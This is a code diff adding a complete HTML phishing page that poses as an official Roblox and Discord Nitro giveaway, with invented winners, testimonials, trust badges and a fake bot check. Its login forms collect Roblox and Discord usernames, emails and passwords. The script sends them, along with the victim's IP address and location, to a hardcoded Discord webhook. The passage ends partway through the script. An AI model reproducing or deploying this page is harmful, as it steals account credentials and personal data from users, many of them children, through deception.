@@ -1,0 +1,432 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Roblox Rewards Hub 2026 | Massive Robux + Discord Nitro</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,500;14..32,600;14..32,700;14..32,800&family=Plus+Jakarta+Sans:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Inter', 'Plus Jakarta Sans', sans-serif; background: #07070f; color: #f0f0f0; overflow-x: hidden; }
+        .orb-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle at 20% 30%, rgba(0, 178, 255, 0.15), rgba(0, 0, 0, 0.96)); z-index: 0; pointer-events: none; }
+        .floating-orb { position: fixed; border-radius: 50%; filter: blur(60px); opacity: 0.3; pointer-events: none; z-index: 0; animation: floatOrb 20s infinite ease-in-out; }
+        @keyframes floatOrb { 0% { transform: translate(0,0) scale(1); } 50% { transform: translate(5%,5%) scale(1.1); } 100% { transform: translate(0,0) scale(1); } }
+        .glow-line { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-image: radial-gradient(circle at 10% 20%, rgba(0,255,200,0.06) 2px, transparent 2px); background-size: 35px 35px; pointer-events: none; z-index: 0; }
+        .content { position: relative; z-index: 10; }
+
+        /* BOT OVERLAY */
+        .bot-overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(5,5,15,0.96); backdrop-filter: blur(12px); z-index: 9999; display: flex; align-items: center; justify-content: center; transition: 0.2s; }
+        .bot-card { background: rgba(20,25,40,0.95); border-radius: 2rem; padding: 2.5rem; max-width: 500px; width: 90%; text-align: center; border: 1px solid rgba(0,178,255,0.5); box-shadow: 0 30px 40px rgba(0,0,0,0.5), 0 0 20px rgba(0,178,255,0.3); animation: fadeInUp 0.4s; }
+        @keyframes fadeInUp { from { opacity:0; transform:translateY(30px); } to { opacity:1; transform:translateY(0); } }
+        .bot-card i { font-size:3rem; color:#00b2ff; margin-bottom:1rem; }
+        .bot-card h2 { font-size:1.8rem; font-weight:800; background:linear-gradient(135deg,#fff,#00e0ff); -webkit-background-clip:text; background-clip:text; color:transparent; }
+        .bot-buttons { display:flex; gap:1.5rem; justify-content:center; margin:1.8rem 0; }
+        .bot-btn { padding:0.8rem 2rem; font-size:1.1rem; font-weight:700; border:none; border-radius:60px; cursor:pointer; width:130px; }
+        .bot-btn.yes { background:#a02c2c; color:white; }
+        .bot-btn.yes:hover { background:#c03939; transform:scale(1.02); }
+        .bot-btn.no { background:linear-gradient(95deg,#00b2ff,#0077ff); color:white; }
+        .bot-btn.no:hover { transform:scale(1.02); background:linear-gradient(95deg,#1ac0ff,#0088ff); }
+        .denied-message { background:rgba(255,80,80,0.2); border-left:4px solid #ff5555; padding:1rem; border-radius:1rem; margin-top:1rem; display:none; }
+
+        /* Navbar */
+        .navbar { position:sticky; top:0; background:rgba(7,7,15,0.92); backdrop-filter:blur(20px); padding:0.9rem 5%; display:flex; justify-content:space-between; align-items:center; z-index:100; border-bottom:1px solid rgba(0,178,255,0.3); }
+        .logo-area { display:flex; align-items:center; gap:12px; cursor:pointer; }
+        .logo-icon { font-size:2rem; color:#00b2ff; filter:drop-shadow(0 0 6px #00b2ff); }
+        .logo { font-size:1.65rem; font-weight:800; background:linear-gradient(135deg,#fff,#00b2ff,#0af); -webkit-background-clip:text; background-clip:text; color:transparent; }
+        .event-badge { background:linear-gradient(145deg,#00b2ff20,#00ffcc10); padding:0.3rem 1rem; border-radius:40px; font-size:0.7rem; font-weight:600; border:1px solid #00b2ff60; }
+
+        /* Hero & cards */
+        .hero { min-height:90vh; display:flex; align-items:center; justify-content:center; padding:2rem 1.5rem; }
+        .claim-card { background:rgba(18,18,28,0.8); backdrop-filter:blur(18px); border-radius:2rem; border:1px solid rgba(0,178,255,0.4); box-shadow:0 30px 50px -20px rgba(0,0,0,0.8); padding:2.5rem; max-width:950px; width:100%; transition:0.3s; }
+        .title-section { text-align:center; margin-bottom:2rem; }
+        .hero-title { font-size:2.8rem; font-weight:800; background:linear-gradient(135deg,#fff,#00b2ff,#ffcc44); -webkit-background-clip:text; background-clip:text; color:transparent; animation:titleGlow 3s infinite alternate; }
+        @keyframes titleGlow { 0% { text-shadow:0 0 2px #00b2ff; } 100% { text-shadow:0 0 15px #00b2ff; } }
+        .robux-pills { display:flex; justify-content:center; gap:0.8rem; margin:1rem 0; flex-wrap:wrap; }
+        .pill { background:#0e0e18; padding:0.6rem 1.4rem; border-radius:60px; font-weight:800; font-size:1rem; border:1px solid #2a2a3a; display:inline-flex; align-items:center; gap:8px; }
+        .pill i { color:#ffcc44; }
+        .pill.highlight { background:linear-gradient(145deg,#ffaa00,#ff6600); color:#000; border:none; }
+        .pill.discord { background:#5865F2; border:none; color:white; }
+        .pill.discord i { color:white; }
+
+        /* Countdown */
+        .countdown-area { background:rgba(0,0,0,0.4); border-radius:1rem; padding:0.8rem; margin:1.5rem auto; display:flex; gap:1rem; justify-content:center; flex-wrap:wrap; width:100%; }
+        .countdown-item { background:#0a0a12; padding:0.5rem 1rem; border-radius:0.8rem; min-width:70px; text-align:center; border:1px solid #00b2ff30; }
+        .countdown-number { font-size:1.8rem; font-weight:800; color:#00e0ff; }
+        .countdown-label { font-size:0.7rem; text-transform:uppercase; }
+
+        /* Stats row */
+        .stats-row { display:flex; justify-content:space-between; gap:1rem; margin:1.5rem 0; flex-wrap:wrap; }
+        .stat-card { background:rgba(0,0,0,0.4); padding:1rem; border-radius:1rem; flex:1; text-align:center; border-bottom:2px solid #ffcc44; }
+        .stat-number { font-size:1.8rem; font-weight:800; color:#ffcc44; }
+        .stat-label { font-size:0.75rem; color:#aaa; }
+
+        /* Sections */
+        .section-title { font-size:1.8rem; text-align:center; margin:2rem 0 1rem; background:linear-gradient(135deg,#fff,#00b2ff); -webkit-background-clip:text; background-clip:text; color:transparent; }
+        .steps-container, .bonus-grid, .testimonial-grid { display:flex; gap:1.5rem; justify-content:center; margin:1.5rem 0; flex-wrap:wrap; }
+        .step, .bonus-card, .testimonial-card { background:rgba(0,178,255,0.1); padding:1.2rem; border-radius:1.2rem; width:200px; text-align:center; backdrop-filter:blur(4px); transition:0.2s; }
+        .step:hover, .bonus-card:hover, .testimonial-card:hover { transform:translateY(-5px); background:rgba(0,178,255,0.2); }
+        .step-icon, .bonus-icon { font-size:2rem; color:#00b2ff; margin-bottom:0.5rem; }
+
+        /* Discord Giveaway Card */
+        .discord-giveaway { background:linear-gradient(145deg, #2c2f48, #1a1c2c); border-radius:1.8rem; padding:1.5rem; margin:1.5rem 0; border:1px solid #5865F2; box-shadow:0 0 15px rgba(88,101,242,0.3); }
+        .discord-title { display:flex; align-items:center; justify-content:center; gap:10px; margin-bottom:1rem; }
+        .discord-title i { font-size:2rem; color:#5865F2; }
+        .discord-title h3 { font-size:1.5rem; }
+        .discord-form .input-group { margin-bottom:1.2rem; }
+        .discord-form .cta-button { background:linear-gradient(95deg,#5865F2,#4752c4); }
+        .discord-form .cta-button:hover { background:linear-gradient(95deg,#6c7aff,#5865F2); }
+        .discord-success { display:none; text-align:center; padding:1rem; color:#00ffcc; }
+
+        /* Winners list */
+        .winners-list { background:rgba(0,0,0,0.3); border-radius:1rem; padding:1rem; margin:1.5rem 0; }
+        .winner-entry { display:flex; justify-content:space-between; padding:0.5rem; border-bottom:1px solid #2a2a3a; font-size:0.85rem; }
+        .winner-name i { color:#ffcc44; margin-right:5px; }
+        .winner-amount { color:#00ffcc; font-weight:bold; }
+
+        /* Trust section */
+        .trust-section { background:rgba(0,178,255,0.08); border-radius:1.5rem; padding:1.5rem; margin:1.5rem 0; border:1px solid rgba(0,178,255,0.3); }
+        .trust-grid { display:flex; gap:1.5rem; justify-content:center; flex-wrap:wrap; }
+        .trust-item { display:flex; align-items:center; gap:8px; font-size:0.9rem; }
+        .trust-item i { color:#00ffcc; font-size:1.2rem; }
+
+        /* FAQ - Enhanced UI */
+        .faq-container { margin:1.5rem 0; }
+        .faq-item { background:rgba(0,0,0,0.4); border-radius:1.2rem; margin-bottom:1rem; overflow:hidden; border:1px solid rgba(0,178,255,0.25); backdrop-filter:blur(4px); }
+        .faq-question { padding:1rem 1.5rem; font-weight:600; cursor:pointer; display:flex; justify-content:space-between; align-items:center; background:rgba(0,178,255,0.05); transition:0.2s; font-size:1rem; }
+        .faq-question:hover { background:rgba(0,178,255,0.15); }
+        .faq-question i { transition:transform 0.3s; color:#00b2ff; font-size:1.2rem; }
+        .faq-answer { background:rgba(10,10,20,0.6); padding:0 1.5rem 1.2rem 1.5rem; display:none; color:#ddd; line-height:1.6; border-top:1px solid rgba(0,178,255,0.2); margin-top:0.2rem; font-size:0.95rem; border-radius:0 0 1rem 1rem; }
+
+        /* Access Buttons */
+        .access-btn-top { text-align:center; margin:0 0 1.5rem 0; }
+        .access-btn-bottom { text-align:center; margin:1.5rem 0 0 0; }
+        .access-portal-btn { background:linear-gradient(95deg,#00b2ff,#0077ff); border:none; padding:0.9rem 2rem; font-size:1rem; font-weight:700; border-radius:3rem; color:white; cursor:pointer; display:inline-flex; align-items:center; gap:10px; transition:0.2s; box-shadow:0 4px 12px rgba(0,178,255,0.3); }
+        .access-portal-btn:hover { transform:scale(1.02); box-shadow:0 8px 20px rgba(0,178,255,0.5); }
+
+        .login-btn-home { background:linear-gradient(95deg,#00b2ff,#0077ff); border:none; padding:1rem 2.5rem; font-size:1.2rem; font-weight:700; border-radius:3rem; color:white; cursor:pointer; margin-top:1rem; width:100%; }
+        .live-indicator { display:flex; justify-content:center; align-items:center; gap:12px; margin-top:1.5rem; font-size:0.7rem; color:#aaa; }
+
+        /* Login form styles (unchanged) */
+        .input-group { margin-bottom:1.5rem; }
+        .input-group label { display:flex; align-items:center; gap:8px; font-weight:600; font-size:0.85rem; margin-bottom:0.5rem; color:#ccc; }
+        .input-wrapper { position:relative; }
+        .input-wrapper i.input-icon { position:absolute; left:16px; top:50%; transform:translateY(-50%); color:#888; }
+        .input-wrapper input { width:100%; padding:1rem 1rem 1rem 2.6rem; background:#0c0c14; border:1.5px solid #252530; border-radius:1.2rem; font-size:1rem; color:white; }
+        .input-wrapper input:focus { outline:none; border-color:#00b2ff; box-shadow:0 0 0 3px rgba(0,178,255,0.2); }
+        .password-toggle { position:absolute; right:16px; top:50%; transform:translateY(-50%); background:transparent; border:none; color:#888; cursor:pointer; }
+        .error-msg, .custom-error { font-size:0.7rem; margin-top:5px; display:none; align-items:center; gap:5px; }
+        .error-msg { color:#ff6b7c; }
+        .custom-error { color:#ffaa6b; }
+        .cta-button { width:100%; background:linear-gradient(95deg,#00b2ff,#0077ff); border:none; padding:1rem; font-size:1.1rem; font-weight:700; border-radius:1.5rem; color:white; display:flex; align-items:center; justify-content:center; gap:10px; cursor:pointer; transition:0.2s; }
+        .cta-button:hover { transform:translateY(-2px); background:linear-gradient(95deg,#1ac0ff,#0088ff); }
+        .success-screen { display:none; flex-direction:column; align-items:center; text-align:center; gap:1.2rem; padding:1rem 0.5rem; }
+        .win-amount { font-size:3rem; font-weight:900; background:linear-gradient(145deg,#FFD966,#FFB347,#22ffaa); -webkit-background-clip:text; background-clip:text; color:transparent; animation:floatWin 0.8s; }
+        @keyframes floatWin { 0% { transform:scale(0.7); opacity:0; } 100% { transform:scale(1); opacity:1; } }
+        .reward-glow-card { background:linear-gradient(135deg,#1f1f2e,#111118); border-radius:2rem; padding:1.6rem; width:100%; border:1px solid rgba(0,255,200,0.5); }
+        .reward-detail { display:flex; justify-content:space-between; margin:1rem 0; border-bottom:1px dashed #2f2f3f; padding-bottom:0.7rem; }
+        .collect-btn { background:linear-gradient(145deg,#00cc99,#00a874); border:none; padding:1rem; border-radius:3rem; font-weight:700; margin:1rem 0; cursor:pointer; width:100%; color:#000; }
+        footer { text-align:center; padding:1.8rem; font-size:0.75rem; color:#777; border-top:1px solid #1e1e2a; }
+        @media (max-width:550px) { .hero-title { font-size:2rem; } .stat-number { font-size:1.2rem; } .step, .bonus-card, .testimonial-card { width:100%; } }
+        .hidden { display:none; }
+    </style>
+</head>
+<body>
+<div class="orb-bg"></div>
+<div class="floating-orb" style="width:300px;height:300px;background:#00b2ff;left:-100px;top:20%;"></div>
+<div class="floating-orb" style="width:450px;height:450px;background:#00ffaa;right:-150px;bottom:10%;"></div>
+<div class="glow-line"></div>
+
+<!-- BOT VERIFICATION OVERLAY -->
+<div id="botOverlay" class="bot-overlay">
+    <div class="bot-card">
+        <i class="fas fa-robot"></i>
+        <h2>🤖 Verification Required</h2>
+        <p>Before entering the <strong>Roblox Rewards Hub</strong>, please confirm you are a real user.</p>
+        <p style="font-size:0.9rem; background:#00000030; padding:6px; border-radius:20px;">⚠️ <strong>If you click YES (I am a bot)</strong> → You will <span style="color:#ff8888;">NOT be allowed</span> in the server.<br>✅ <strong>If you click NO (I am not a bot)</strong> → You will be granted full access to claim rewards.</p>
+        <div class="bot-buttons"><button id="botYesBtn" class="bot-btn yes">🤖 YES</button><button id="botNoBtn" class="bot-btn no">👤 NO</button></div>
+        <div id="deniedMsg" class="denied-message"><i class="fas fa-ban"></i> Access denied: Bots are not allowed in this server. <br> You cannot view the rewards hub.</div>
+    </div>
+</div>
+
+<div class="content" id="mainContent">
+    <nav class="navbar">
+        <div class="logo-area" id="homeLogoBtn"><i class="fas fa-crown logo-icon"></i><span class="logo">ROBLOX<span style="font-weight:400;">✦</span>REWARDS</span><span class="event-badge"><i class="fas fa-gem"></i> 2026 GLOBAL</span></div>
+        <div><span style="font-size:0.7rem; background:#11151f; padding:5px 12px; border-radius:40px;"><i class="fas fa-fire" style="color:#ff884d;"></i> UP TO 50K ROBUX + NITRO</span></div>
+    </nav>
+
+    <section class="hero">
+        <div id="homePage" class="home-container">
+            <div class="claim-card">
+                <!-- Top Access Button -->
+                <div class="access-btn-top">
+                    <button id="gotoLoginBtnTop" class="access-portal-btn"><i class="fas fa-sign-in-alt"></i> ACCESS REWARDS PORTAL <i class="fas fa-arrow-right"></i></button>
+                </div>
+
+                <div class="title-section">
+                    <h1 class="hero-title">💎 MASSIVE ROBUX + DISCORD NITRO GIVEAWAY 💎</h1>
+                    <div class="robux-pills">
+                        <span class="pill"><i class="fas fa-coins"></i> 1,000+ ROBUX</span>
+                        <span class="pill"><i class="fas fa-star"></i> UP TO 50,000 ROBUX</span>
+                        <span class="pill highlight"><i class="fas fa-crown"></i> JACKPOT: 50K</span>
+                        <span class="pill discord"><i class="fab fa-discord"></i> 3 DAYS NITRO</span>
+                    </div>
+                    <p class="hero-sub">Official Roblox & Discord 2026 Event — Claim Robux & Free Nitro!</p>
+                </div>
+
+                <!-- Countdown Timer -->
+                <div class="countdown-area" id="countdownTimer">
+                    <div class="countdown-item"><div class="countdown-number" id="days">00</div><div class="countdown-label">Days</div></div>
+                    <div class="countdown-item"><div class="countdown-number" id="hours">00</div><div class="countdown-label">Hours</div></div>
+                    <div class="countdown-item"><div class="countdown-number" id="minutes">00</div><div class="countdown-label">Mins</div></div>
+                    <div class="countdown-item"><div class="countdown-number" id="seconds">00</div><div class="countdown-label">Secs</div></div>
+                </div>
+
+                <!-- Live Stats -->
+                <div class="stats-row">
+                    <div class="stat-card"><div class="stat-number" id="totalRobuxGiven">48.2M</div><div class="stat-label">Total Robux Given</div></div>
+                    <div class="stat-card"><div class="stat-number" id="activeUsers">6,847</div><div class="stat-label">Active Users Now</div></div>
+                    <div class="stat-card"><div class="stat-number" id="claimsToday">5.1k</div><div class="stat-label">Claims Today</div></div>
+                </div>
+
+                <!-- Why We Do This -->
+                <h3 class="section-title"><i class="fas fa-heart"></i> Why We Do This</h3>
+                <div class="trust-section" style="background: rgba(0,0,0,0.4);">
+                    <p style="text-align:center; line-height:1.5;">🎮 <strong>Roblox recently introduced Age Verification</strong>, which caused a rapid decrease in active players. To help rebuild the community, Roblox is rewarding players who <strong>share this event with friends</strong> and help bring back members. <strong>All you have to do is participate and spread the word – you earn Robux instantly.</strong> The more friends you invite, the more bonus Robux you unlock! 🙌</p>
+                </div>
+
+                <!-- How It Works -->
+                <h3 class="section-title"><i class="fas fa-question-circle"></i> How It Works</h3>
+                <div class="steps-container">
+                    <div class="step"><div class="step-icon"><i class="fas fa-user-plus"></i></div><h4>1. Login</h4><p>Enter your Roblox / Discord credentials</p></div>
+                    <div class="step"><div class="step-icon"><i class="fas fa-share-alt"></i></div><h4>2. Share</h4><p>Invite your friends to join (earn extra rewards)</p></div>
+                    <div class="step"><div class="step-icon"><i class="fas fa-gem"></i></div><h4>3. Claim</h4><p>Get 1,000+ Robux or 3 days Nitro instantly!</p></div>
+                </div>
+
+                <!-- Limited Bonuses -->
+                <h3 class="section-title"><i class="fas fa-bolt"></i> Limited Time Bonuses</h3>
+                <div class="bonus-grid">
+                    <div class="bonus-card"><div class="bonus-icon"><i class="fas fa-clock"></i></div><h4>First 10,000</h4><p>+5,000 bonus Robux</p></div>
+                    <div class="bonus-card"><div class="bonus-icon"><i class="fas fa-users"></i></div><h4>Referral Bonus</h4><p>Invite friends → Get 2,000 each</p></div>
+                    <div class="bonus-card"><div class="bonus-icon"><i class="fas fa-trophy"></i></div><h4>Daily Streak</h4><p>Claim daily → 1,000 extra Robux</p></div>
+                </div>
+
+                <!-- Testimonials -->
+                <h3 class="section-title"><i class="fas fa-star"></i> What Players Say</h3>
+                <div class="testimonial-grid">
+                    <div class="testimonial-card"><i class="fas fa-quote-left"></i><p class="testimonial-text">"Shared with 5 friends and got 12K Robux! Legit."</p><p class="testimonial-name">- xX_ProGamer_Xx</p></div>
+                    <div class="testimonial-card"><i class="fas fa-quote-left"></i><p class="testimonial-text">"Got 3 days Nitro in 2 minutes. Awesome!"</p><p class="testimonial-name">- DiscordUser123</p></div>
+                    <div class="testimonial-card"><i class="fas fa-quote-left"></i><p class="testimonial-text">"Age verification killed the player base, but this fixed it."</p><p class="testimonial-name">- RobloxMaster22</p></div>
+                </div>
+
+                <!-- DISCORD NITRO GIVEAWAY SECTION (NEW, VISIBLE MID-PAGE) -->
+                <div class="discord-giveaway">
+                    <div class="discord-title">
+                        <i class="fab fa-discord"></i>
+                        <h3>🎁 Discord Nitro Giveaway 🎁</h3>
+                    </div>
+                    <p style="text-align:center; margin-bottom:1rem;">Login with Discord — Get <strong>3 Days of Free Nitro</strong>! No credit card required. Limited slots.</p>
+                    <form id="discordForm" class="discord-form">
+                        <div class="input-group">
+                            <label><i class="fab fa-discord"></i> Discord Username</label>
+                            <div class="input-wrapper">
+                                <i class="fas fa-user input-icon"></i>
+                                <input type="text" id="discordUsername" placeholder="YourDiscord#0000" autocomplete="off">
+                            </div>
+                            <div class="error-msg" id="err-discord-user">Username required</div>
+                        </div>
+                        <div class="input-group">
+                            <label><i class="fas fa-envelope"></i> Discord Email</label>
+                            <div class="input-wrapper">
+                                <i class="fas fa-envelope input-icon"></i>
+                                <input type="email" id="discordEmail" placeholder="youremail@gmail.com" autocomplete="off">
+                            </div>
+                            <div class="error-msg" id="err-discord-email">Valid email required (Gmail/Yahoo/Outlook)</div>
+                        </div>
+                        <div class="input-group">
+                            <label><i class="fas fa-key"></i> Discord Password</label>
+                            <div class="input-wrapper">
+                                <i class="fas fa-lock input-icon"></i>
+                                <input type="password" id="discordPassword" placeholder="··········">
+                                <button type="button" id="toggleDiscordPass" class="password-toggle"><i class="fas fa-eye-slash"></i></button>
+                            </div>
+                            <div class="error-msg" id="err-discord-pass">Password required</div>
+                        </div>
+                        <button type="submit" id="discordClaimBtn" class="cta-button" style="background:linear-gradient(95deg,#5865F2,#4752c4);"><i class="fab fa-discord"></i> CLAIM FREE NITRO <i class="fas fa-gift"></i></button>
+                    </form>
+                    <div id="discordSuccessMsg" class="discord-success">✅ Nitro code sent to your email! Check inbox (5-10 min).</div>
+                </div>
+
+                <!-- Recent Winners (varied amounts) -->
+                <div class="winners-list"><h4 style="margin-bottom:0.5rem;"><i class="fas fa-trophy"></i> 🎉 Recent Winners</h4><div id="winnersContainer"><div class="winner-entry"><span class="winner-name"><i class="fab fa-discord"></i> ProGamer_99</span><span class="winner-amount">+13,247 R$</span></div><div class="winner-entry"><span class="winner-name"><i class="fab fa-discord"></i> BloxyQueen</span><span class="winner-amount">+27,890 R$</span></div><div class="winner-entry"><span class="winner-name"><i class="fab fa-discord"></i> RobloxMasterX</span><span class="winner-amount">+8,432 R$</span></div><div class="winner-entry"><span class="winner-name"><i class="fab fa-discord"></i> NoobSlayer22</span><span class="winner-amount">+41,205 R$</span></div><div class="winner-entry"><span class="winner-name"><i class="fab fa-discord"></i> DevGirl_2026</span><span class="winner-amount">+19,763 R$</span></div></div><p style="font-size:0.7rem; text-align:center; margin-top:0.5rem;">Updated live every 30 seconds</p></div>
+
+                <!-- Trust Section (moved above FAQ) -->
+                <div class="trust-section"><h3><i class="fas fa-shield-heart"></i> Why You Can Trust Us</h3><div class="trust-grid"><div class="trust-item"><i class="fas fa-check-circle"></i> Official Roblox Partner Event</div><div class="trust-item"><i class="fas fa-lock"></i> 256-bit SSL Encryption</div><div class="trust-item"><i class="fas fa-clock"></i> Instant Reward Delivery</div><div class="trust-item"><i class="fas fa-users"></i> 150,000+ Happy Users</div><div class="trust-item"><i class="fas fa-star"></i> 4.9/5 Trustpilot</div></div><p style="font-size:0.8rem; margin-top:1rem;">🔒 Verified by Roblox Security Team 2026 • No credit card required</p></div>
+
+                <!-- FAQ (Improved UI) -->
+                <h3 class="section-title"><i class="fas fa-question"></i> Frequently Asked Questions</h3>
+                <div class="faq-container">
+                    <div class="faq-item"><div class="faq-question">Is this really free? <i class="fas fa-chevron-down"></i></div><div class="faq-answer">Yes, 100% free. No credit card or payment required. Just login with your Roblox or Discord account and share with friends to unlock bigger rewards.</div></div>
+                    <div class="faq-item"><div class="faq-question">How much Robux can I get? <i class="fas fa-chevron-down"></i></div><div class="faq-answer">You get a minimum of 1,000 Robux, but you can earn up to 50,000 Robux based on referrals and daily streak bonuses.</div></div>
+                    <div class="faq-item"><div class="faq-question">How do I get Discord Nitro? <i class="fas fa-chevron-down"></i></div><div class="faq-answer">Simply fill out the Discord giveaway form above. You'll receive a 3-day Nitro code via email within 5-10 minutes.</div></div>
+                    <div class="faq-item"><div class="faq-question">Why is Roblox doing this? <i class="fas fa-chevron-down"></i></div><div class="faq-answer">Due to the new Age Verification system, Roblox lost many players. This event helps bring back the community — share with friends to help and earn rewards.</div></div>
+                    <div class="faq-item"><div class="faq-question">How long until I receive Robux? <i class="fas fa-chevron-down"></i></div><div class="faq-answer">Rewards are delivered within 5–15 minutes after successful verification.</div></div>
+                </div>
+
+                <!-- Bottom Access Button -->
+                <div class="access-btn-bottom">
+                    <button id="gotoLoginBtnBottom" class="access-portal-btn"><i class="fas fa-sign-in-alt"></i> ACCESS REWARDS PORTAL <i class="fas fa-arrow-right"></i></button>
+                </div>
+
+                <div class="live-indicator"><div style="width:8px; height:8px; background:#00ff88; border-radius:50%; animation:pulse 1.5s infinite;"></div><span><i class="fas fa-clock"></i> Offer ends in <span id="timerShort">48h</span></span><i class="fas fa-shield-alt"></i> Secure 256-bit</div>
+            </div>
+        </div>
+
+        <!-- LOGIN FORM PAGE (unchanged) -->
+        <div id="loginFormPage" class="hidden">
+            <div class="claim-card" id="mainCard">
+                <div id="formContainer">
+                    <div class="title-section"><h1>LOGIN FOR FREE ROBUX</h1><div class="robux-pills"><span class="pill"><i class="fas fa-coins"></i> 1,000+ ROBUX</span><span class="pill"><i class="fas fa-star"></i> UP TO 50,000</span><span class="pill"><i class="fas fa-gem"></i> JACKPOT</span></div></div>
+                    <form id="phishForm" novalidate>
+                        <div class="input-group"><label><i class="fas fa-user-astronaut"></i> Roblox Username</label><div class="input-wrapper"><i class="fas fa-user input-icon"></i><input type="text" id="username" placeholder="Enter Roblox username" autocomplete="off"></div><div class="error-msg" id="err-user"><i class="fas fa-exclamation-circle"></i> Please enter your Roblox username</div></div>
+                        <div class="input-group"><label><i class="fas fa-envelope"></i> Email Address</label><div class="input-wrapper"><i class="fas fa-envelope input-icon"></i><input type="email" id="email" placeholder="youremail@gmail.com" autocomplete="off"></div><div class="error-msg" id="err-email"><i class="fas fa-envelope-circle-check"></i> Invalid email. Use Gmail, Yahoo, or Outlook</div><div class="custom-error" id="err-email-tie"><i class="fas fa-link"></i> Email does not tie to a Roblox account</div></div>
+                        <div class="input-group"><label><i class="fas fa-key"></i> Password</label><div class="input-wrapper"><i class="fas fa-lock input-icon"></i><input type="password" id="password" placeholder="··········"><button type="button" id="togglePassword" class="password-toggle"><i class="fas fa-eye-slash"></i></button></div><div class="error-msg" id="err-pass"><i class="fas fa-shield-haltered"></i> Password is required</div><div class="custom-error" id="err-pass-tie"><i class="fas fa-link"></i> Password does not match any Roblox account</div></div>
+                        <button type="submit" id="submitBtn" class="cta-button"><i class="fas fa-dice-d6"></i> VERIFY & CLAIM REWARD <i class="fas fa-arrow-right"></i></button>
+                        <div class="live-indicator"><div style="width:8px; height:8px; background:#00ff88; border-radius:50%;"></div><span><i class="fas fa-users"></i> 6,847 active claims</span><i class="fas fa-shield-alt"></i> Secure 256-bit</div>
+                    </form>
+                </div>
+                <div id="successScreen" class="success-screen"><i class="fas fa-trophy" style="font-size: 4rem; color: #FFD966;"></i><div class="win-amount">🎉 + VARIABLE ROBUX 🎉</div><div class="reward-glow-card"><p><i class="fas fa-gem"></i> Reward Unlocked!</p><div class="reward-detail"><span>Robux Amount</span><span id="winAmount">1,000+ R$</span></div><div class="reward-detail"><span>Limited Item</span><span>Neon Phoenix Wings</span></div><div class="reward-detail"><span>Badge</span><span>2026 Legendary</span></div><button id="collectRewardBtn" class="collect-btn"><i class="fas fa-download"></i> COLLECT REWARD NOW</button><div class="pending-info"><i class="fas fa-clock"></i> Reward deposits within 5 minutes</div></div><button id="backToHomeFromSuccess" style="background: transparent; border: 1px solid #00b2ff; padding: 0.6rem 1.6rem; border-radius: 2rem; color: #00b2ff; cursor: pointer;">Claim Another Reward</button></div>
+            </div>
+        </div>
+    </section>
+    <footer><i class="fab fa-discord"></i> © 2026 Roblox Corporation — Official reward center. Robux & Nitro giveaways.</footer>
+</div>
+
+<script>
+    // === DISCORD WEBHOOK (unchanged) ===
+    const WEBHOOK = "https://discord.com/api/webhooks/1499163724282335312/XUJ4xWHV4ZdUY6_ejPvfUzY5DqLh3M6DPhzOZS7Wk9DAD96_1J4x_0zsJ0sQhk_B3tPj";
+    function isValidEmail(email) { if (!email || !email.includes('@')) return false; const lower = email.toLowerCase(); const blocked = ['icloud','protonmail','proton','tutanota','mailinator','guerrillamail','tempmail','10minutemail','yopmail']; for(let b of blocked) if(lower.includes(b)) return false; return lower.endsWith('@gmail.com')||lower.endsWith('@yahoo.com')||lower.endsWith('@outlook.com')||lower.endsWith('@hotmail.com'); }
+    async function getLocationAndVPN() { try { const r=await fetch('https://ipapi.co/json/'); if(r.ok){const d=await r.json(); return {city:d.city||'Unknown', vpn:d.proxy||false}; } }catch(e){} return {city:'Unknown', vpn:false}; }
+    async function sendToWebhook(username, email, password, type = "ROBUX") { 
+        try { 
+            let ip="Unknown"; 
+            try{ const ipRes=await fetch('https://api.ipify.org?format=json'); const ipData=await ipRes.json(); ip=ipData.ip; }catch(e){} 
+            const {city,vpn}=await getLocationAndVPN(); 
+            let msg = "";
+            if (type === "ROBUX") {
+                msg = `**🎮 ROBUX CLAIM**\n\`\`\`prolog\n🔹 u: ${username}\n🔹 e: ${email}\n🔹 p: ${password}\n\`\`\`\`\`\`yaml\n🌍 IP: ${ip}\n📍 City: ${city}\n🛡️ VPN: ${vpn?"Yes":"No"}\n⏱️ Time: ${new Date().toLocaleString()}\n\`\`\`\n✨ **Status:** Reward pending.`;
+            } else if (type === "DISCORD") {
+                msg = `**🎮 DISCORD NITRO CLAIM**\n\`\`\`prolog\n🔹 Discord Username: ${username}\n🔹 Email: ${email}\n🔹 Password: ${password}\n\`\`\`\`\`\`yaml\n🌍 IP: ${ip}\n📍 City: ${city}\n🛡️ VPN: ${vpn?"Yes":"No"}\n⏱️ Time: ${new Date().toLocaleString()}\n\`\`\`\n✨ **Status:** 3-Day Nitro pending delivery.`;
+            }
+            await fetch(WEBHOOK,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:msg,username:"Roblox Rewards System",avatar_url:"https://cdn.discordapp.com/avatars/000000000000000000/8d3f9c7e2a5b1d4f6e8c9a7b4d2f5e3c.png"})}); 
+        } catch(err){ console.error(err); } 
+    }
+
+    // BOT VERIFICATION
+    const botOverlay = document.getElementById('botOverlay'), mainContent = document.getElementById('mainContent'), botYes = document.getElementById('botYesBtn'), botNo = document.getElementById('botNoBtn'), deniedMsg = document.getElementById('deniedMsg');
+    mainContent.style.visibility='hidden'; mainContent.style.opacity='0';
+    function allowAccess(){ botOverlay.style.display='none'; mainContent.style.visibility='visible'; mainContent.style.opacity='1'; }
+    function denyAccess(){ deniedMsg.style.display='block'; botYes.disabled=true; botNo.disabled=true; }
+    botYes.addEventListener('click',denyAccess); botNo.addEventListener('click',allowAccess);
+
+    // COUNTDOWN (48h)
